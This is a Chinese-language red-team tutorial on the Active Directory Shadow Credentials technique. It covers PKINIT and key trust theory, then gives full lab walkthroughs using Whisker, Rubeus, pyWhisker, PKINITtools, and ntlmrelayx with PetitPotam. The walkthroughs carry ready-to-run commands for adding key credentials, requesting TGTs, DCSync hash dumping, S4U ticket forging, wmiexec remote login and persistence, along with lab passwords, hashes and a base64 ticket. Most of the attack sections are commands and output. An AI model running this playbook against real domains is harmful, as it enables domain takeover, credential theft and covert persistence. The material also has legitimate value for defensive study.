0x00 概念
=======

在2019年欧洲黑帽大会期间，提到了一种修改目标计算机或用户账户msDS-KeyCredentialLink属性的域内权限维持技术。Shadow Credential可以理解为Windows中的msDS-KeyCredentialLink属性值

活动目录的用户和计算机对象有一个称为 `msDS-KeyCredentialLink` 的属性，在其中可以设置原始的公钥。当试图用PKINIT（后面会介绍）进行预认证时，KDC将检查认证用户是否知道匹配的私钥，如果有匹配，将发送一个TGT，以此来实现对目标对象的持久和隐蔽的访问。

攻击思路
----

在获取高权限用户后，通过给目标用户添加Shadow Credential（msDS-KeyCredentialLink属性），结合相关攻击工具获取到`.pfx`私钥证书文件，之后使用`.pfx`文件申请目标用户的TGT，进而得到其NTLM Hash。

利用条件
----

也就是说**只要能改变某个账号的msDS-KeyCredentialLink属性，就能获得这个账号的TGT和NTLM Hash**  
以下用户具有修改msDS-KeyCredentialLink属性的权限：

- 域管理员（Domain Admins组成员）
- 高权限用户（具有GenericAll或GenericWrite权限）
- Enterprise Key Admins组成员
- Key Admins组成员
- 机器账户（修改自身）

可以在`高级安全设置`中查看到相应权限  
![OvU08U.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c4824edf205ce6da92827de474a3cf4036596497.png)

目标配置条件
------

- 域控制器版本在Windows Server 2016以上
- 域控制器上安装Active Directory证书服务（AD CS）或者其他服务器上安装AD CS

攻击原理详解
------

### PKINIT

在Kerberos认证协议中，TGT只能通过验证一个名为 "预认证 "的第一步来获得，预认证可以以对称方式（用DES、RC4、AES128或AES256密钥）或非对称方式（用证书）进行验证。非对称的预认证方式被称为PKINIT。

PKINIT是一个Kerberos协议的扩展协议，允许Kerberos预认证阶段中使用非对称密钥进行加密。基于PKINIT协议，客户端使用自身私钥对预验证数据（Pre-authentication Data）进行加密，KDC使用客户端的公钥进行解密（与数字证书相似）。

当公钥被设置在目标的msDs-KeyCredentialLink中时，生成的证书可以用Pass-the-Certificate来获得TGT和进一步的访问。

### 传统请求TGT流程

直接进行请求，使用对称加密算法

![Ova6SS.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e8a040bce2ee0f998d7be40f5759033dfb0f3384.png)

### 证书信任模型

在**证书信任（Certificate Trust）模型**中，公钥基础设施（PKI）允许 KDC 和客户端使用数字证书交换双方各自的公钥  
流程如下：

1. 客户端使用Client私钥加密Client证书和时间戳，发送给KDC
2. 服务端使用Client公钥验证Client证书链的合法性以及确认解密后的时间戳正常
3. 服务端返回TGT和会话密钥（Session Key）  
    ![OvasW8.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f611d203cd06fd53ceeda291f81a6a6af7971d43.png)

### 密钥信任模型

在**密钥信任（Kry Trust）模型**中，支持无密码身份验证，并且PKINIT身份验证是基于原始密钥数据。  
客户端公钥存储在`msDS-KeyCredentialLink`属性中，该属性的值为**密钥凭证（Key Credentials）**，包含创建日期、所有者的可分辨名称、GUID和公钥等信息的序列化对象。  
![OvarJf.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1a51257ccb589f99f84595e98914ee6813d725c3.png)

在Windows企业版中，客户端登录时会使用私钥进行PKINIT身份验证：

- 在密钥信任模型下，域控使用客户端`msDS-KeyCredentialLink` 属性中的公钥进行解密预身份验证数据。
- 在证书信任模型下，域控验证客户端证书的信任链，使用其中的公钥进行解密Pre-Authentication数据。  
    认证成功后将交换会话密钥

0x02 环境信息
=========

环境拓扑图：  
![OvdH4P.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-348f088cbf9ef97060cc70ecaf89283a02442cf8.png)

环境配置信息：

```txt
域名: redteam.lab
域控: 
    操作系统: Windows Server 2016
    主机名: DC2016
    IP: 10.10.2.20
域内主机:
    操作系统: Windows 10
    主机名: WIN10-1
    IP: 10.10.2.100
攻击机:
    操作系统: kali Linux
    IP: 10.10.2.77
```

0x03 实战测试 Shadow Credentials
============================

攻击思路1：域内机器修改影子凭证
----------------

在已获取到高权限的用户（如administrator）后，执行Shadow Credentials攻击，实现权限维持。  
*假设获取到域管理员mark的权限，具有修改msDS-KeyCredentialLink属性的权限*

### 1 Whisker工具修改属性

使用[Whisker](https://github.com/eladshamir/Whisker)工具，向域控制器的`msDS-KeyCredentialLink`属性添加指定目标的`Shadow Credentials`

```shell
# 向域控制器的msDS-KeyCredentialLink属性添加Shadow Credentials
Whisker.exe add /target:DC2016$ /domain:redteam.lab /dc:DC2016.redteam.lab

# 列出域控的msDS-KeyCredentialLink属性
Whisker.exe list /target:DC2016$ /domain:redteam.lab /dc:DC2016.redteam.lab

# 删除属性msDS-KeyCredentialLink属性
Whisker.exe remove /target:DC2016$ /deviceid:33d43eb3-3cb2-4e63-ba92-7de00af46505
```

![Ovwl8K.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-aad5bbb79ae112efa666b387edf9d5df1fef31a2.png)  
修改成功后，工具会提示出下一步的利用代码

### 2 使用Rubeus工具申请TGT票据

```shell
# 申请TGT票据
Rubeus.exe asktgt /user:DC2016$ /certificate:[value] /password:"1fxDXbHQvbZpHm0S" /domain:redteam.lab /dc:DC2016.redteam.lab /getcredentials /show /nowrap /ptt
```

![OvwQC6.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-69563fbd06f62317afd7e15d9c09a08195080d0b.png)  
如果没有添加入Shadow Credentials，则会报`KDC_ERR_CLIENT_NAME_MISMATCH`错误

### 3-1 票据利用：DCSync攻击

使用mimikatz工具借助票据执行DCSync攻击得到administrator的Hash值

```shell
# 执行DCSync攻击获得Hash值
mimikatz.exe "lsadump::dcsync /domain:redteam.lab /user:redteam\Administrator" "exit"
```

![OvwuU1.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-099c3ae7d793e1f3a1a652a160e0dd05f20f82a9.png)  
这里存入内存中的为TGT，不是服务票据，不具有访问的权限，dir不行，可以申请CIFS票据进行访问，见下。

### 3-2 票据利用：CIFS服务票据远程访问

使用Rubeus工具，申请CIFS服务票据，访问目标服务。

```shell
# 使用Rubeus借助S4U2Self协议获取域控上的其他服务票据ST
Rubeus.exe s4u /self /impersonateuser:REDTEAM\Administrator /altservice:CIFS/DC2016.redteam.lab /dc:DC2016.redteam.lab /ptt /ticket:[value] /nowrap

# 访问
dir \\DC2016.redteam.lab\c$
```

![OvwK4x.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cc0041f50767faf1ce7ca4adaf881bea41228c10.png)

### 4-1权限维持操作：根据证书申请TGT

当mark密码被修改时，我们将不在拥有mark的控制权，但是`msDS-KeyCredentialLink`属性已经被修改，可以通过以下方式恢复权限  
由于证书certificate已经获取到，和第2步一致，在任意一台主机中执行命令申请到域控的TGT

```shell
Rubeus.exe asktgt /user:DC2016$ /certificate:[value] /password:"1fxDXbHQvbZpHm0S" /domain:redteam.lab /dc:DC2016.redteam.lab /getcredentials /show /ptt /nowrap
```

### 4-2权限维持操作：转存为kirbi文件保存使用

将申请到的Base64加密的TGT转换为kirbi文件保存使用

```powershell
powerpick [IO.File]::WriteAllBytes("C:\Users\Public\Documents\ticket.kirbi",[Convert]::FromBase64String("doIFyjCCBcagAwIBBaEDAgEWooIE4zCCBN9hggTbMIIE16ADAgEFoQ0bC1JFRFRFQU0uTEFCoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLmxhYqOCBJ0wggSZoAMCARKhAwIBAqKCBIsEggSHocZIIXUk/6ACZTuoItkyxJUONjPNdRQJQstpJ91GarFnkdIdDtPSTDanprknzPBoksBYVKHo7maejQ2CjSroQKGbgP0Qdb7dw6bvaAlv6t+49bcPz+mRZ3G9a+3Kxm9Q+WN4LYV64uqUhSybqYr2ulf+g+PCrS0sEa+ukRkw8PCFR+fRGbH5vGX/mLPkRfTTX+gsLPwjyHQzV2bnDC/2TNJGN6YdJhua2bE1RG+7id1a5QbV8mIwffZyKf8bGtMhHF3obd05JCMoFIkYVnIhTsUJg1W/c4/J9qiUeFpmtonOUEgNOONTxautRseImuNNifMwZeCgAoLwHHnnnlhmzA0z+t2BnSsOvIAodB24D2uZ6qByWtAsGFRi+EPOpZiTEAyDK+OVHp271WOnWQY4AjO6JoBGxQeUtvdjbGCXenl6yaujIn9R4qvVDs1pYD8DGnCsS3B/qLDe6QTAGPJwQV+Ja74oePLeKHDrsrdlCS6wtdWHQCsY/ecw0B0Z56BxJA2ZvauwwMQHjz0BLUs3oTOmkNvBK0t1iWQincTR2v4j2Dn9YhXj/9ufjKH8MiCR+oMPau6At3lXpM27ROr1vIo2qGUM5HLJNFU3GHaFat/HH+8k55tdDKMdbEhrbMa1fk6NakJWx1A68WhtsaOxJIbDXbZKy6f4AO5QcWKt0BwDK9dVcl903E3Ui0Gd8G0uR6VSp2Iobfd37SIiuAiwS5YTjCkARVZBR+D3a8RGOz3vUr3Yjzg84w2B76oGK4FaLAy6YZjMth/nCBNR/2KBGZ79mLKK+Gxl6o1DZRMPlh3+qeaHE1jgte1koZToEOnvPJA5YPCEnwL6+r5ICMXiGL2T23utv694PAdU1lqHbZwPC9EXQEfvaT0X+5QHeju3OrL0WnmeU3Qpt7auBM2Ao9UhFCD6/1PTNK5XIQ1y9fDCfLsq9CvtVrQAMH7jLeBvlUBbRrETghzR8MzF0NovHW5EUfD6/FMvlC3pEMdKyNPNSxRUWTw4/gnWQovXjLw39VDb+pl2tz5u5mOPQKEVgjalOtmc7thDR9t3iHD5QtTcZUaE4oBxxCFUCbVvYCKpAICaVoQo4i13LCzmESfzv2iVmD4rhiB1YJomjuX8WlfZdaWuOSkNmVMIYzgXNDl1zw+d4TE+j8FILWdPONCT28+x62eWjpDPHV7muPOTbuSMeCBaa4S+KHk1/87ZF37SA0vLR9qWH9pxCluoG4x/huV4rZ6e/JmLfpM3X1Acb/+zOUas89cmPBrab4NgSQ/xld7P3cd+EiGuvj0lkX1vM55H4xSbHoKynlqVPrTM87Jvb9H6b0OCKtDNl7mHvbSHkvfjIzZUnC/zgKzRSDn7/YHtOW5/e4RdfzK8L3djVmUOctrMPBKj+rSeD7S+F4Ww85PvzdhQIZmXhVirtblJOUGggNPvGmsRkv9S5iWOAyd0JgnU9erKB50q7MoORxSJmEcp2WBFIxNBMujpJITZZfNxLQJ6E/sF6uzOcRa8tsH4lijCvJxbWrcYOiS6m9mvEeSvg8wti6OB0jCBz6ADAgEAooHHBIHEfYHBMIG+oIG7MIG4MIG1oBswGaADAgEXoRIEEIcyiVeGxVUDwvB2UuisxJyhDRsLUkVEVEVBTS5MQUKiFDASoAMCAQGhCzAJGwdEQzIwMTYkowcDBQBA4QAApREYDzIwMjIwNTIxMTUxNTI4WqYRGA8yMDIyMDUyMjAxMTUyOFqnERgPMjAyMjA1MjgxNTE1MjhaqA0bC1JFRFRFQU0uTEFCqSAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLmxhYg=="))
```

![OvDnEj.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f76596c844a107674dc98a2c567c7922a092bcb6.png)

导入票据并使用

```shell
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"
mimikatz.exe "lsadump::dcsync /domain:redteam.lab /user:redteam\Administrator" "exit"
```

![OvDuUs.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6a1cb1a8e2c22c6346ae8979ee8558d027f7d00d.png)

### 4-3权限维持操作：转存为ccache文件保存使用

使用[RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache) 工具将Base64的ticket文件转换为`.ccache`格式文件，便于结合Impacket工具套件使用

```shell
# 转换格式
rubeustoccache.py [base64_input] test.kirbi test.ccache

# 导出Hash
KRB5CCNAME=test.ccache python3 ~/Desktop/secretsdump.py -k redteam.lab/DC2016\$@DC2016.redteam.lab -no-pass -just-dc
```

![OvwyrQ.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-dbbafc2f1a7a309326e8dc66b8180e7b710ec00b.png)

攻击思路2：域外机器修改影子凭证
----------------

当我们只获得到一个高权限域用户凭证（用户&amp;密码），但是没有shell，可以使用[pyWhisker](https://github.com/ShutdownRepo/pywhisker)工具可实现在域网络外的主机上进行攻击操作。

### 1 pywhisker工具修改属性

使用[pyWhisker](https://github.com/ShutdownRepo/pywhisker)工具修改属性申请证书

```shell
# 对域控制器账户执行攻击，生成证书
python3 pywhisker.py -d "redteam.lab" -u "mark" -p "123.com" --target "DC2016$" --action "add" --filename dc2016
```

![OvwsKg.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1f5d8a90998a83d0d23f6333185ecf766388bea2.png)

### 2 使用pfx证书申请TGT票据

使用[PKINITtools](https://github.com/dirkjanm/PKINITtools)通过KDC身份验证，申请到票据

```shell
python3 gettgtpkinit.py -cert-pfx dc2016.pfx -pfx-pass JdhrfLCa3OMQJwfK8YhS redteam.lab/DC2016$ DC2016.ccache
```

![OvwDxS.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-70c9c842b5978e3dbb827b0c8dda282e32163413.png)

> 小问题：如果出现minikerberos.protocol.errors.KerberosError: Error Name: KDC\_ERR\_PADATA\_TYPE\_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 表示该域控不支持PKINIT服务，需要安装AD CS然后重启。

使用[getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)脚本得到域控机器账户

```shell
# AS-REP encryption key:60ed51cde2bd2ecfded5d72bb0ba7945ef3aa15002de4c550ce136e47b2491e1

KRB5CCNAME=DC2016.ccache python3 getnthash.py -key 60ed51cde2bd2ecfded5d72bb0ba7945ef3aa15002de4c550ce136e47b2491e1 redteam.lab/DC2016$
```

![OvwB28.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1ea7609ae5a9638701ee02064919e5f48de590e6.png)

### 3-1 票据利用：DCSync导出Hash

由于得到的是域控机器账户的TGT，一种利用思路是DCSync导出Hash，另一种是申请CIFS访问票据实现远程登录

```shell
# 导出Hash
KRB5CCNAME=DC2016.ccache python3 secretsdump.py -k redteam.lab/DC2016\$@DC2016.redteam.lab -just-dc -no-pass

# Hash登录
python3 wmiexec.py -hashes :83a140d89e42046e8daf5394d386a69a redteam.lab/administrator@DC2016.redteam.lab -dc-ip 10.10.2.20

```

![Ovw5xU.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bfe98c088d337878286b0772dd3872ee840dd6f8.png)

### 3-2 票据利用：申请CIFS访问域控

```shell
# 申请CIFS票据登录
python3 gets4uticket.py kerberos+ccache://redteam.lab\\DC2016\$:DC2016.ccache@DC2016.redteam.lab cifs/DC2016.redteam.lab@redteam.lab Administrator@redteam.lab Administrator.ccache -v
# 远程登录
KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k redteam.lab/administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20
```

![Ovw42T.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-39a92fd2ca6e926de65f5c0a47aa54c9a7697010.png)

### 4 权限维持操作

当权限丢失时，可以使用第一步中生成的pfx证书，申请到域控TGT恢复权限，命令如同第二步

```shell
python3 gettgtpkinit.py -cert-pfx dc2016.pfx -pfx-pass JdhrfLCa3OMQJwfK8YhS redteam.lab/DC2016$ DC2016.ccache
```

攻击思路3：影子凭证强制认证
--------------

Shadow Credentials可以联动NTLM Relay攻击，针对目标主机，强制修改其 `msDS-KeyCredentialLink` 属性，实现对目标机器持久和隐蔽的访问。

在最新版本的[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)工具中，实现了影子凭证技术，通过添加`--shadow-credentials --shadow-target`两个参数来启用。该攻击可以与PetitPotam、printerbug或ShadowCoerce等强制认证结合使用。

在 KB957097 补丁中修改 SMB 身份验证答复的验证方式。使得域控发起的认证请求不能中继回域控本身，因此这种方法不能直接用于攻击域控，这里更新了新的测试环境，影子凭证强制认证的目标对象设定为：安装了AD CS的独立服务器

### 新环境配置

```txt
域名: redteam.lab
域控: 
    操作系统: Windows Server 2016
    主机名: DC2016
    IP: 10.10.2.20
服务器: 
    操作系统: Windows Server 2016
    主机名: SERVER2016
    IP: 10.10.2.25
    安装了 AD CS
域内主机:
    操作系统: Windows 10
    主机名: WIN10-1
    IP: 10.10.2.100
攻击机:
    操作系统: kali Linux
    IP: 10.10.2.77
```

![OvWZrt.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-68098b619e3b0bb2196832a9b4ba685a78a7c999.png)

### 1 启动监听

使用[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)工具开启监听  
由于需要进行跨协议中继认证，即从SMB中继到LDAP协议，将会强制要求LDAP签名，有两种解决方法：

1. 使用HTTP等跨协议中继
2. 利用CVE-2019-1040漏洞强制消除签名的限制，  
    在ntlmrelayx工具中提供了 `--remove-mic` 参数实现签名的消除 ```shell
    python3 ntlmrelayx.py -t ldap://10.10.2.20 --remove-mic --shadow-credentials --shadow-target SERVER2016$
    ```
    
    ![OvWnVf.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-71270be78b86e7f646eef6a68f0ccf30ada34358.png)  
    关于mic等中继的概念，可参考[这篇文章](https://en.hackndo.com/ntlm-relay/)

### 2 执行NTLM Relay攻击

使用PetitPotam.py进行强制认证，也可以使用printerbug、ShadowCoerce等其他工具进行攻击

```shell
python3 PetitPotam.py -u mark -p 123.com -d redteam.lab 10.10.2.77 SERVER2016.redteam.lab
```

![OvWeqP.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-604a21d7b28c260a27ede33e2ace3624b0ff38dc.png)  
在监听界面中，成功执行影子凭证强制认证攻击，修改了目标对象的`msDS-KeyCredentialLink`，生成了证书，并提供了后续攻击代码  
![OvWua8.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8bb0a1e2b3832e5506be59edd8d82302d6c004e6.png)

### 3 申请TGT票据

这里先将上述的证书更名为 `SERVER2016.pfx` ，使用gettgtpkinit.py工具申请票据

```shell
python3 gettgtpkinit.py -cert-pfx SERVER2016.pfx -pfx-pass qOBBCYvuLnELkIS7sBAt redteam.lab/SERVER2016$ SERVER2016.ccache
```

![OvWVKI.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6dd0553b936fcd7ff5a91e3bfba86d953aa94bfb.png)

### 4 申请CIFS访问票据

使用gets4uticket.py工具申请CIFS访问票据。  
由于不是域控，不能进行DCSync攻击

```shell
python3 gets4uticket.py kerberos+ccache://redteam.lab\\SERVER2016\$:SERVER2016.ccache@DC2016.redteam.lab cifs/SERVER2016.redteam.lab@redteam.lab Administrator@redteam.lab Administrator.ccache -v
```

![OvWQPg.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5918bb899cdda80fc9213907bb26d1bce6d3176a.png)

但可以使用getnthash.py工具得到机器账户的`SERVER2016$`NTLM Hash

```shell
KRB5CCNAME=SERVER2016.ccache python3 getnthash.py -key 8281288a206035ebaab9e37066f06a5beeeaa699c4616e156894a3134ea22735  redteam.lab/SERVER2016$
```

![OvWKIS.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-837474b3c1e5dd35d991053d185f94b760d00b24.png)

### 5 使用票据远程访问

```shell
KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k redteam.lab/administrator@SERVER2016.redteam.lab -no-pass -dc-ip 10.10.2.25
```

![OvWlGQ.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1538bf0f199ae89829e6ef67fc15db9cfbcbdb93.png)

0x04 参考
=======

[Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)

[Shadow Credentials](https://whoamianony.top/shadow-credentials/)

[NTLM Relay - hackndo](https://en.hackndo.com/ntlm-relay/)